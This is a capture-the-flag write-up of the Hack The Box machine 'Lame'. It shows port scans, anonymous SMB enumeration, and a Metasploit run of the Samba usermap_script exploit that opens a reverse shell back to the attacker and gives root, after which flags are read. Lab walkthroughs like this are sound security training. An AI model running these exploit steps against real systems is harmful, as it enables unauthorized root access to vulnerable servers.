# Lame
## Samba
## Metasploit
``````

➜  ~ rustscan -a 10.10.10.3 --ulimit 5000

Open 10.10.10.3:22
Open 10.10.10.3:21
Open 10.10.10.3:139
Open 10.10.10.3:445
Open 10.10.10.3:3632

➜  Lame sudo nmap -sV -T4 -p21,22,139,445,3632 -oA Lame -vv 10.10.10.3 

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

➜  ~ smbclient -L //10.10.10.3/

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP 

➜  ~ smbclient //10.10.10.3/tmp 

➜  Lame sudo nmap -sCV -T4 -p139,445 10.10.10.3 -vv

PORT    STATE SERVICE     REASON         VERSION
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

➜  Lame sudo msfconsole
msf6 > search Samba 3.0.20 < 3.0.25rc3
msf6 > use 0
msf6 exploit(multi/samba/usermap_script) > show options
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set lhost tun0
msf6 exploit(multi/samba/usermap_script) > run

whoami

Response:

root

find / -name user.txt

/home/makis/user.txt

find / -name root.txt

/root/root.txt

cat /home/makis/user.txt

user_flag

cat /root/root.txt

root_flag

``````

![image](https://0xc0rvu5.github.io/docs/assets/images/20220621060317.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220621060251.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220621060446.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220621060658.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220621062040.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220625004424.png)

#hacking 
